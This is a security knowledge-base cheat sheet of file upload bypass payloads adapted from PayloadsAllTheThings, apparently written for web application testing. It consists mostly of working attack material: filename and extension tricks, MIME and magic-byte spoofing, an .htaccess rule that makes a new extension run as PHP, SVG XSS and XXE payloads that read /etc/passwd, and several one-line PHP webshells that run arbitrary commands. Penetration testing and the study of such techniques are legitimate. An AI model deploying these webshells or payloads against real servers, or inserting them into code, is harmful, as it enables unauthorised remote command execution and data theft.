---
summary: Malicious upload bypasses — extension, MIME, magic-byte, .htaccess, SVG/XXE, webshells.
status: active
tags: [security, payloads, upload, web]
private: false
---

# File Upload Bypass Payloads

Source: [PayloadsAllTheThings/Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files). Find where the file lands and how it's served, then defeat the specific filter.

## Extension bypass

```
shell.php.jpg          # double ext (server executes on .php)
shell.jpg.php          # reverse double ext
shell.phtml  .php3 .php4 .php5 .php7 .phar .pht .inc   # alt PHP handlers
shell.pHp .PhAr        # case
shell.php%00.jpg       # null byte (older)
shell.php%20  shell.php.  shell.php/  shell.php;.jpg   # trailing tricks
```

## MIME / content-type spoof

Set the upload request's `Content-Type` to `image/gif`, `image/png`, or `image/jpeg` while keeping the executable extension.

## Magic-byte prefix (content sniffing)

Prepend a valid header so file-type checks pass, then the payload:

```
GIF89a;<?php system($_GET[0]); ?>       # GIF magic + PHP
\xff\xd8\xff<?php ... ?>                 # JPEG magic
```

## .htaccess trick (Apache, if you can upload it)

```apache
AddType application/x-httpd-php .rce
```
Then upload `shell.rce` → executed as PHP.

## SVG / XML payloads

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>   <!-- stored XSS -->
<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>   <!-- XXE -->
```

## Minimal webshells

```php
<?php system($_GET['cmd']); ?>
<?=`$_GET[0]`?>
<?php if($_POST){system($_POST['cmd']);} ?>
```

## Windows-specific

```
shell.asax:.jpg              # NTFS alternate data stream
name.%E2%80%AEphp.jpg        # right-to-left override -> renders as name.gpj.php
```

## Related

- [Payload Cheat Sheets — Index](kb://11-security-payloads-payloads-index)
- [Web Application Testing](kb://11-security-playbook-web-app-testing)
